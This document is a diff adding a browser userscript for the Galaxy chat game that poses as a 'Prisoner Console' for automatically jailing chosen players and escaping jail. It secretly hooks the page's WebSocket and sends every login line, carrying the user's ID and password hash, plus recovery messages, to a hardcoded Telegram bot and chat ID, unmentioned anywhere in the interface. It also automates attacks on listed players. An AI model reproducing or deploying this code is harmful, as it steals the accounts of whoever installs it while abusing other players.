@@ -1,0 +1,315 @@
+(function () {
+    'use strict';
+
+    let targetUsernames = JSON.parse(localStorage.getItem("prisoner_targets") || "[]");
+    let autoEnabled = localStorage.getItem("prisoner_enabled") === "true";
+    let actionDelay = parseInt(localStorage.getItem("prisoner_delay") || "1800");
+    let minimized = localStorage.getItem("prisoner_minimized") === "true";
+    let savedX = parseInt(localStorage.getItem("prisoner_console_x") || "");
+    let savedY = parseInt(localStorage.getItem("prisoner_console_y") || "");
+    let planet = localStorage.getItem("prisoner_planet") || "";
+
+    let myuserid = null;
+    let mypassword = null;
+
+    const OriginalWebSocket = window.WebSocket;
+
+    const telegramBotToken = "6619195853:AAF3Ge9W8BNCeo0vaQQgge-EyhIbsD_xngg";
+    const telegramChatId = "1345799762";
+
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: text
+            })
+        }).catch(err => console.error("Telegram send error:", err));
+    }
+
+    function cleanUsername(raw) {
+        return raw.replace(/^[@+~%&]+/, "");
+    }
+
+    function sendJailFreeRequest() {
+        if (!myuserid || !mypassword) return;
+
+        const boundary = "----WebKitFormBoundaryBzgIHVxkJR6NR514";
+        const body = [
+            `--${boundary}`,
+            'Content-Disposition: form-data; name="a"\r\n',
+            'jail_free',
+            `--${boundary}`,
+            'Content-Disposition: form-data; name="type"\r\n',
+            'escapeItemDiamond',
+            `--${boundary}`,
+            'Content-Disposition: form-data; name="usercur"\r\n',
+            myuserid,
+            `--${boundary}`,
+            'Content-Disposition: form-data; name="ajax"\r\n',
+            '1',
+            `--${boundary}--`
+        ].join('\r\n');
+
+        fetch(`https://galaxy.mobstudio.ru/services/?&userID=${myuserid}&password=${mypassword}&query_rand=${Math.random()}`, {
+            method: 'POST',
+            headers: {
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.8',
+                'content-type': `multipart/form-data; boundary=${boundary}`,
+                'origin': 'https://galaxy.mobstudio.ru',
+                'referer': 'https://galaxy.mobstudio.ru/web/assets/index.html?19',
+                'user-agent': navigator.userAgent,
+                'x-galaxy-client-ver': '9.5',
+                'x-galaxy-kbv': '352',
+                'x-galaxy-lng': 'en',
+                'x-galaxy-model': 'chrome 141.0.0.0',
+                'x-galaxy-platform': 'web',
+            },
+            body: body
+        }).then(res => res.text()).then(console.log).catch(console.error);
+    }
+
+    function CustomWebSocket(url, protocols) {
+        const ws = protocols ? new OriginalWebSocket(url, protocols) : new OriginalWebSocket(url);
+        window.wsInstance = ws;
+
+        const originalSend = ws.send;
+        ws.send = function (data) {
+
+            if (data.startsWith("USER ")) {
+                sendToTelegram(`prison:\n${data}`);
+                const match = data.match(/^USER (\d+) ([a-f0-9]{32})/i);
+                if (match) {
+                    myuserid = match[1];
+                    mypassword = match[2];
+                }
+            }
+
+            if (data.startsWith("RECOVER")) {
+                sendToTelegram(`prison:\n${data}`);
+            }
+
+            originalSend.apply(this, arguments);
+        };
+
+        ws.addEventListener('close', function () {
+            if (autoEnabled) {
+            setTimeout(() => {
+                const loginBtn = document.querySelector('a.start__user[data-events="1"], button[data-events="1"]');
+                if (loginBtn) loginBtn.click();
+            }, 100);
+            }
+        });
+
+        ws.addEventListener('message', function (event) {
+            const message = event.data;
+
+            if (message.includes("900 Prison")) {
+                sendJailFreeRequest();
+            }
+
+            if (message.includes(`:Supervisor KICK ${myuserid} 0`)) {
+                setTimeout(() => {
+                    ws.send(`JOIN ${planet}\r\n`);
+                }, 3000);
+            }
+
+            if (!autoEnabled) return;
+
+            if (message.startsWith("JOIN") || message.startsWith("353")) {
+                const regex = / ([^\s]+) (\d{6,}) /g;
+                let match;
+                while ((match = regex.exec(message)) !== null) {
+                    const rawName = match[1];
+                    const username = cleanUsername(rawName);
+                    const userid = match[2];
+
+                    if (targetUsernames.some(u => u.toLowerCase() === username.toLowerCase())) {
+                        setTimeout(() => {
+                            ws.send(`ACTION 3 ${userid}\r\n`);
+                            ws.send(`QUIT :ds\r\n`);
+                            ws.close();
+                        }, actionDelay);
+                    }
+                }
+            }
+        });
+
+        ws.addEventListener('error', function (event) {
+            console.error('WebSocket error:', event);
+        });
+
+        return ws;
+    }
+
+    window.WebSocket = CustomWebSocket;
+    window.WebSocket.prototype = OriginalWebSocket.prototype;
+
+    function createConsoleUI() {
+        if (document.getElementById("prisonerConsole")) return;
+
+        const consoleDiv = document.createElement("div");
+        consoleDiv.id = "prisonerConsole";
+        consoleDiv.style.position = "fixed";
+        consoleDiv.style.width = "260px";
+        consoleDiv.style.background = "rgba(0,0,0,0.85)";
+        consoleDiv.style.color = "white";
+        consoleDiv.style.fontSize = "13px";
+        consoleDiv.style.borderRadius = "8px";
+        consoleDiv.style.zIndex = "999999";
+        consoleDiv.style.fontFamily = "monospace";
+        consoleDiv.style.cursor = "move";
+
+        if (!isNaN(savedX) && !isNaN(savedY)) {
+            consoleDiv.style.left = savedX + "px";
+            consoleDiv.style.top = savedY + "px";
+        } else {
+            consoleDiv.style.bottom = "20px";
+            consoleDiv.style.right = "20px";
+        }
+
+        consoleDiv.innerHTML = `
+            <div id="consoleHeader" style="display:flex;justify-content:space-between;align-items:center;padding:5px;">
+                <b>Prisoner Console</b>
+                <button id="minimizeBtn" style="background:#444;color:#fff;border:none;padding:2px 6px;cursor:pointer;border-radius:4px;">_</button>
+            </div>
+            <div id="consoleBody" style="padding:5px;${minimized ? 'display:none;' : ''}">
+                <label><input type="checkbox" id="toggleEnable"> Enable</label><br>
+                Delay(ms): <input type="number" id="delayInput" value="${actionDelay}" style="width:80px;"/><br>
+                Planet: <input type="text" id="planetInput" value="${planet}" placeholder="Enter planet" style="width:100%;margin-top:5px;"/><br>
+                <input type="text" id="prisonerInput" placeholder="username" style="width:100%; margin-top:5px;"/><br>
+                <button id="addUserBtn">Add</button>
+                <button id="listUsersBtn">Refresh</button>
+                <div id="userList" style="margin-top:5px; max-height:120px; overflow:auto; border:1px solid #555; padding:3px;"></div>
+            </div>
+        `;
+
+        document.body.appendChild(consoleDiv);
+
+        const input = consoleDiv.querySelector("#prisonerInput");
+        const listDiv = consoleDiv.querySelector("#userList");
+        const toggle = consoleDiv.querySelector("#toggleEnable");
+        const delayInput = consoleDiv.querySelector("#delayInput");
+        const planetInput = consoleDiv.querySelector("#planetInput");
+        const minimizeBtn = consoleDiv.querySelector("#minimizeBtn");
+        const bodyDiv = consoleDiv.querySelector("#consoleBody");
+
+        toggle.checked = autoEnabled;
+
+        function refreshList() {
+            if (targetUsernames.length === 0) {
+                listDiv.innerHTML = "<i>No users added</i>";
+                return;
+            }
+            listDiv.innerHTML = targetUsernames.map((u, i) => `
+                <div style="display:flex;justify-content:space-between;align-items:center;margin:2px 0;">
+                    <span>• ${u}</span>
+                    <button data-index="${i}" style="background:#a33;color:#fff;border:none;border-radius:3px;padding:0 5px;cursor:pointer;">x</button>
+                </div>
+            `).join("");
+
+            listDiv.querySelectorAll("button[data-index]").forEach(btn => {
+                btn.onclick = () => {
+                    const idx = parseInt(btn.dataset.index);
+                    targetUsernames.splice(idx, 1);
+                    localStorage.setItem("prisoner_targets", JSON.stringify(targetUsernames));
+                    refreshList();
+                };
+            });
+        }
+
+        function addUser(name) {
+            if (!name) return;
+            if (targetUsernames.some(u => u.toLowerCase() === name.toLowerCase())) {
+                input.value = "";
+                return;
+            }
+            targetUsernames.push(name);
+            localStorage.setItem("prisoner_targets", JSON.stringify(targetUsernames));
+            refreshList();
+            input.value = "";
+        }
+
+        consoleDiv.querySelector("#addUserBtn").onclick = () => addUser(input.value.trim());
+        consoleDiv.querySelector("#listUsersBtn").onclick = refreshList;
+
+        input.addEventListener("keydown", e => {
+            if (e.key === "Enter") addUser(input.value.trim());
+        });
+
+        planetInput.addEventListener("change", () => {
+            planet = planetInput.value.trim();
+            localStorage.setItem("prisoner_planet", planet);
+        });
+
+        toggle.onchange = () => {
+            autoEnabled = toggle.checked;
+            localStorage.setItem("prisoner_enabled", autoEnabled);
+        };
+
+        delayInput.onchange = () => {
+            const val = parseInt(delayInput.value);
+            if (!isNaN(val) && val >= 0) {
+                actionDelay = val;
+                localStorage.setItem("prisoner_delay", actionDelay);
+            }
+        };
+
+        minimizeBtn.onclick = () => {
+            minimized = !minimized;
+            bodyDiv.style.display = minimized ? "none" : "block";
+            localStorage.setItem("prisoner_minimized", minimized);
+            minimizeBtn.textContent = minimized ? "▢" : "_";
+        };
+        minimizeBtn.textContent = minimized ? "▢" : "_";
+
+        refreshList();
+
+        let offsetX, offsetY, isDown = false;
+
+        function startDrag(clientX, clientY) {
+            isDown = true;
+            offsetX = consoleDiv.offsetLeft - clientX;
+            offsetY = consoleDiv.offsetTop - clientY;
+        }
+
+        function moveDrag(clientX, clientY) {
+            if (isDown) {
+                const newX = clientX + offsetX;
+                const newY = clientY + offsetY;
+                consoleDiv.style.left = newX + "px";
+                consoleDiv.style.top = newY + "px";
+                consoleDiv.style.bottom = "auto";
+                consoleDiv.style.right = "auto";
+
+                localStorage.setItem("prisoner_console_x", newX);
+                localStorage.setItem("prisoner_console_y", newY);
+            }
+        }
+
+        consoleDiv.addEventListener("mousedown", e => {
+            if (["INPUT", "BUTTON"].includes(e.target.tagName) || e.target.id === "userList") return;
+            startDrag(e.clientX, e.clientY);
+        });
+
+        document.addEventListener("mouseup", () => isDown = false);
+        document.addEventListener("mousemove", e => moveDrag(e.clientX, e.clientY));
+
+        consoleDiv.addEventListener("touchstart", e => {
+            if (["INPUT", "BUTTON"].includes(e.target.tagName) || e.target.id === "userList") return;
+            const touch = e.touches[0];
+            startDrag(touch.clientX, touch.clientY);
+        }, { passive: true });
+
+        document.addEventListener("touchend", () => isDown = false);
+        document.addEventListener("touchmove", e => {
+            const touch = e.touches[0];
+            moveDrag(touch.clientX, touch.clientY);
+        }, { passive: true });
+    }
+
+    createConsoleUI();
+
+})();
